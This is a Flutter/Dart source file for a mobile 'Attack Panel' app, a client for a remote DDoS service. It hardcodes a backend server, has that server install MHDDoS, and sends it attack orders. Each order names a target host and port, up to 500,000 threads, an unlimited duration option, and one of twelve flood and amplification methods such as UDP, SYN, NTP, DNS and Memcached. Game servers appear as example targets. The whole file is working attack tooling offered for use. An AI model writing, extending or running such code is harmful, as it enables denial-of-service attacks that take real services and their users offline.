import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final threadsController = TextEditingController();
  final String baseUrl = "http://hostinger.gunturxhoshino.biz.id:4495";
  late AnimationController _controller;
  String selectedMethod = "UDP_FLOOD";
  double attackDuration = 60;
  bool _isUnlimited = false;
  bool _isAttacking = false;
  int? _currentPid;
  bool _isInstalling = false;
  bool _isMHDDoSInstalled = false;

  // DAFTAR METHOD SERANGAN LENGKAP
  final List<Map<String, dynamic>> attackMethods = [
    {"value": "UDP_FLOOD", "label": "🔥 UDP Flood - Heavy Lag", "needPort": true, "defaultPort": 10015},
    {"value": "TCP_FLOOD", "label": "⚡ TCP Flood - Extreme Lag", "needPort": true, "defaultPort": 10015},
    {"value": "HTTP_FLOOD", "label": "🌐 HTTP Flood - Server Crash", "needPort": true, "defaultPort": 80},
    {"value": "SYN_FLOOD", "label": "🎯 SYN Flood - Packet Rush", "needPort": true, "defaultPort": 10015},
    {"value": "ICMP_FLOOD", "label": "📡 ICMP Flood - Ping Death", "needPort": false, "defaultPort": 0},
    {"value": "SLOWLORIS", "label": "🐌 Slowloris - Slow Kill", "needPort": true, "defaultPort": 80},
    {"value": "NTP_AMPLIFY", "label": "💥 NTP Amplify - Massive", "needPort": true, "defaultPort": 123},
    {"value": "DNS_AMPLIFY", "label": "📀 DNS Amplify - Reflection", "needPort": true, "defaultPort": 53},
    {"value": "GRE_IP", "label": "🛸 GRE IP Tunnel Flood", "needPort": false, "defaultPort": 0},
    {"value": "VSE_QUERY", "label": "🎮 VSE Query - Game Server", "needPort": true, "defaultPort": 27015},
    {"value": "MEMCACHED", "label": "💾 Memcached DDoS", "needPort": true, "defaultPort": 11211},
    {"value": "SSDP_AMP", "label": "📺 SSDP Amplification", "needPort": true, "defaultPort": 1900},
  ];

  final List<String> threadPresets = ["1000", "5000", "10000", "50000", "100000", "250000", "500000"];

  final Color primaryDark = Colors.black;
  final Color primaryWhite = Colors.white;
  final Color accentGrey = const Color(0xFF444444);
  final Color cardDark = const Color(0xFF1A1A1A);

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    
    threadsController.text = "";
    portController.text = "";
    _checkMHDDoS();
  }

  Future<void> _checkMHDDoS() async {
    try {
      final response = await http.get(Uri.parse("$baseUrl/api/status")).timeout(const Duration(seconds: 5));
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['message']?.contains('MHDDoS') == true) {
          setState(() => _isMHDDoSInstalled = true);
        }
      }
    } catch (e) {}
  }

  Future<void> _installMHDDoS() async {
    setState(() => _isInstalling = true);
    
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/install"),
        headers: {"Content-Type": "application/json"},
      ).timeout(const Duration(seconds: 120));
      
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data["success"] == true) {
          _showAlert("✅ INSTALL SUCCESS!", 
              "MHDDoS has been installed successfully!\n\n"
              "You can now launch REAL DDoS attacks.\n\n"
              "⚠️ This is a one-time installation.");
          setState(() => _isMHDDoSInstalled = true);
        } else {
          _showAlert("❌ Install Failed", data["message"] ?? "Unknown error");
        }
      } else {
        _showAlert("❌ Install Failed", "HTTP ${response.statusCode}");
      }
    } catch (e) {
      _showAlert("❌ Install Error", e.toString());
    } finally {
      setState(() => _isInstalling = false);
    }
  }

  bool get needPort {
    final method = attackMethods.firstWhere((m) => m["value"] == selectedMethod);
    return method["needPort"];
  }

  int get defaultPort {
    final method = attackMethods.firstWhere((m) => m["value"] == selectedMethod);
    return method["defaultPort"];
  }

  Future<void> _startAttack() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final threads = threadsController.text.trim();

    if (target.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP/Domain cannot be empty.");
      return;
    }

    if (needPort && port.isEmpty) {
      _showAlert("❌ Invalid Port", "Please input a valid port.\nDefault for this method: $defaultPort");
      return;
    }

    if (threads.isEmpty) {
      _showAlert("❌ Invalid Threads", "Please input threads amount.");
      return;
    }

    int threadsInt = int.tryParse(threads) ?? 50000;
    if (threadsInt < 100) threadsInt = 100;
    if (threadsInt > 500000) threadsInt = 500000;

    int durationInt = _isUnlimited ? 0 : attackDuration.toInt();
    int portInt = needPort ? (int.tryParse(port) ?? defaultPort) : 0;

    setState(() {
      _isAttacking = true;
    });

    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/attack"),
        headers: {"Content-Type": "application/json"},
        body: json.encode({
          "target": target,
          "port": portInt,
          "threads": threadsInt,
          "duration": durationInt,
          "mode": selectedMethod,
          "unlimited": _isUnlimited,
        }),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data["success"] == true) {
          _currentPid = data["pid"];
          _showAlert("✅ SUCCESS!", 
              "🚀 REAL DDoS Attack launched!\n\n"
              "🎯 Target: $target${needPort ? ':$portInt' : ''}\n"
              "⚙️ Method: $selectedMethod\n"
              "🧵 Threads: $threadsInt\n"
              "⏱️ ${_isUnlimited ? '♾️ UNLIMITED MODE' : 'Duration: ${durationInt}s'}\n"
              "🆔 PID: ${_currentPid}\n\n"
              "🔥 Using: ${data['method'] ?? 'MHDDoS'}");
        } else {
          _showAlert("❌ Failed", data["message"] ?? "Unknown error");
          setState(() => _isAttacking = false);
        }
      } else {
        _showAlert("❌ Server Error", "HTTP ${response.statusCode}");
        setState(() => _isAttacking = false);
      }
    } catch (e) {
      _showAlert("❌ Connection Error", e.toString());
      setState(() => _isAttacking = false);
    }
  }

  Future<void> _stopAttack() async {
    try {
      await http.post(
        Uri.parse("$baseUrl/api/stop"),
        headers: {"Content-Type": "application/json"},
        body: json.encode({"pid": _currentPid}),
      ).timeout(const Duration(seconds: 3));
    } catch (e) {}
    
    setState(() {
      _isAttacking = false;
      _currentPid = null;
    });
    
    _showAlert("🛑 Stopped", "Attack has been stopped.");
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: accentGrey)
        ),
        title: Text(title, style: TextStyle(color: primaryWhite, fontFamily: 'Orbitron')),
        content: Text(msg, style: TextStyle(color: primaryWhite.withOpacity(0.7), fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: accentGrey)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final method = attackMethods.firstWhere((m) => m["value"] == selectedMethod);
    final isIcmp = selectedMethod == "ICMP_FLOOD" || selectedMethod == "GRE_IP";
    
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: AppBar(
        backgroundColor: primaryDark,
        elevation: 0,
        title: const Text(
          "🚀 Attack Panel",
          style: TextStyle(
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            color: Colors.white,
          ),
        ),
        centerTitle: true,
        actions: [
          if (_isAttacking)
            Container(
              margin: const EdgeInsets.only(right: 16),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.3),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: Colors.red, width: 1),
              ),
              child: const Row(
                children: [
                  Icon(Icons.flash_on, color: Colors.red, size: 12),
                  SizedBox(width: 4),
                  Text("ATTACKING", style: TextStyle(color: Colors.red, fontSize: 10)),
                ],
              ),
            ),
        ],
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: ClipOval(
                  child: Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      color: accentGrey,
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(Icons.flash_on, size: 50, color: Colors.white),
                  ),
                ),
              ),
              const SizedBox(height: 20),
              
              // INSTALL MHDDoS BUTTON
              if (!_isMHDDoSInstalled)
                Container(
                  width: double.infinity,
                  margin: const EdgeInsets.only(bottom: 16),
                  child: ElevatedButton.icon(
                    onPressed: _isInstalling ? null : _installMHDDoS,
                    icon: _isInstalling 
                        ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                        : const Icon(Icons.download, color: Colors.white),
                    label: Text(
                      _isInstalling ? "INSTALLING MHDDoS..." : "📦 INSTALL MHDDoS (REAL DDoS)",
                      style: const TextStyle(
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        color: Colors.white,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.orange,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    ),
                  ),
                ),
              
              // STATUS MHDDoS
              if (_isMHDDoSInstalled)
                Container(
                  width: double.infinity,
                  margin: const EdgeInsets.only(bottom: 16),
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.green.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.green),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.check_circle, color: Colors.green, size: 20),
                      SizedBox(width: 10),
                      Expanded(
                        child: Text(
                          "✅ MHDDoS INSTALLED - REAL DDoS READY!",
                          style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold, fontSize: 12),
                        ),
                      ),
                    ],
                  ),
                ),
              
              Text(
                "Target Input & Methods",
                style: TextStyle(
                  color: primaryWhite,
                  fontFamily: 'Orbitron',
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Divider(color: accentGrey, thickness: 0.6),
              const SizedBox(height: 25),

              // Target IP
              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP/Domain",
                child: TextField(
                  controller: targetController,
                  style: TextStyle(color: primaryWhite),
                  cursorColor: accentGrey,
                  enabled: !_isAttacking,
                  decoration: _inputStyle("Contoh: 203.116.115.1 atau game.ff.garena.com"),
                ),
              ),
              const SizedBox(height: 20),

              // Port
              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port Target",
                child: Column(
                  children: [
                    TextField(
                      controller: portController,
                      enabled: !_isAttacking && needPort,
                      keyboardType: TextInputType.number,
                      style: TextStyle(color: (!_isAttacking && needPort) ? primaryWhite : Colors.grey),
                      cursorColor: (!_isAttacking && needPort) ? accentGrey : Colors.grey,
                      decoration: _inputStyle(
                        (!_isAttacking && needPort) ? "Port (default: $defaultPort)" : "Method ini tidak perlu port",
                        isEnabled: !_isAttacking && needPort,
                      ),
                    ),
                    if (needPort) ...[
                      const SizedBox(height: 8),
                      Wrap(
                        spacing: 8,
                        children: [443, 8080, 10015, 80, 53, 123].map((p) {
                          return FilterChip(
                            label: Text(p.toString()),
                            selected: portController.text == p.toString(),
                            onSelected: !_isAttacking ? (_) {
                              setState(() => portController.text = p.toString());
                            } : null,
                            backgroundColor: Colors.grey[800],
                            selectedColor: Colors.red,
                          );
                        }).toList(),
                      ),
                    ],
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // Threads
              _buildInputCard(
                icon: Icons.speed,
                title: "Jumlah Threads",
                child: Column(
                  children: [
                    Wrap(
                      spacing: 8,
                      runSpacing: 8,
                      children: threadPresets.map((thread) {
                        return FilterChip(
                          label: Text(thread),
                          selected: threadsController.text == thread,
                          onSelected: !_isAttacking ? (_) {
                            setState(() => threadsController.text = thread);
                          } : null,
                          backgroundColor: Colors.grey[800],
                          selectedColor: Colors.red,
                        );
                      }).toList(),
                    ),
                    const SizedBox(height: 12),
                    TextField(
                      controller: threadsController,
                      enabled: !_isAttacking,
                      keyboardType: TextInputType.number,
                      style: TextStyle(color: primaryWhite),
                      decoration: _inputStyle("Custom threads (min 100, max 500000)"),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // Method
              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    value: selectedMethod,
                    dropdownColor: cardDark,
                    isExpanded: true,
                    iconEnabledColor: accentGrey,
                    style: TextStyle(color: primaryWhite),
                    items: attackMethods.map((method) {
                      return DropdownMenuItem<String>(
                        value: method["value"],
                        child: Row(
                          children: [
                            Icon(
                              method["needPort"] ? Icons.portrait : Icons.wifi_off,
                              size: 16,
                              color: accentGrey,
                            ),
                            const SizedBox(width: 10),
                            Expanded(
                              child: Text(
                                method["label"],
                                style: TextStyle(color: primaryWhite, fontSize: 13),
                              ),
                            ),
                          ],
                        ),
                      );
                    }).toList(),
                    onChanged: _isAttacking ? null : (value) {
                      setState(() {
                        selectedMethod = value!;
                        if (!needPort) portController.clear();
                        else if (portController.text.isEmpty) {
                          portController.text = defaultPort.toString();
                        }
                      });
                    },
                  ),
                ),
              ),
              const SizedBox(height: 20),

              // Duration
              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  children: [
                    SwitchListTile(
                      title: const Text("UNLIMITED MODE", style: TextStyle(color: Colors.white, fontSize: 12)),
                      value: _isUnlimited,
                      activeColor: Colors.red,
                      onChanged: _isAttacking ? null : (value) {
                        setState(() => _isUnlimited = value);
                      },
                      dense: true,
                      contentPadding: EdgeInsets.zero,
                    ),
                    if (!_isUnlimited) ...[
                      const SizedBox(height: 10),
                      Row(
                        children: [
                          const Text("⏱️ ", style: TextStyle(color: Colors.white)),
                          Expanded(
                            child: Slider(
                              value: attackDuration,
                              min: 10,
                              max: 3600,
                              divisions: 359,
                              label: "${attackDuration.toInt()}s",
                              activeColor: Colors.red,
                              inactiveColor: primaryWhite.withOpacity(0.1),
                              onChanged: _isAttacking ? null : (value) {
                                setState(() => attackDuration = value);
                              },
                            ),
                          ),
                          Text("${attackDuration.toInt()}s", style: const TextStyle(color: Colors.white)),
                        ],
                      ),
                    ],
                  ],
                ),
              ),
              const SizedBox(height: 40),

              // Buttons
              Row(
                children: [
                  Expanded(
                    child: ElevatedButton.icon(
                      onPressed: (_isAttacking ? _stopAttack : _startAttack),
                      icon: Icon(_isAttacking ? Icons.stop : Icons.bolt, color: primaryWhite),
                      label: Text(
                        _isAttacking ? "🛑 STOP ATTACK" : "💥 LAUNCH DDOS ATTACK",
                        style: TextStyle(
                          fontSize: 14,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1.2,
                          color: primaryWhite,
                        ),
                      ),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _isAttacking ? Colors.orange : Colors.red,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                        elevation: 6,
                      ),
                    ),
                  ),
                ],
              ),

              const SizedBox(height: 20),
              
              // Info panel
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.grey[900],
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text("💡 INFO:", style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 5),
                    Text(
                      "• Method aktif: $selectedMethod\n"
                      "• Base Server: ${baseUrl.replaceAll("http://", "")}\n"
                      "• Gunakan threads 50000+ untuk hasil maksimal\n"
                      "• ${method["needPort"] ? "Method ini membutuhkan port" : "Method ini TIDAK membutuhkan port"}\n"
                      "${!_isMHDDoSInstalled ? "• ⚠️ INSTALL MHDDoS dulu untuk REAL DDoS!" : "• ✅ MHDDoS ACTIVE - REAL DDoS READY!"}",
                      style: TextStyle(color: Colors.grey[400], fontSize: 11),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: accentGrey.withOpacity(0.5), width: 1),
        boxShadow: [
          BoxShadow(
            color: accentGrey.withOpacity(0.2),
            blurRadius: 8,
            spreadRadius: 1,
          )
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: Colors.red, size: 20),
              const SizedBox(width: 8),
              Text(title,
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isEnabled = true}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isEnabled ? accentGrey : Colors.grey),
      filled: true,
      fillColor: primaryDark,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isEnabled ? accentGrey : Colors.grey),
        borderRadius: BorderRadius.circular(16),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isEnabled ? Colors.red : Colors.grey),
        borderRadius: BorderRadius.circular(16),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    threadsController.dispose();
    super.dispose();
  }
}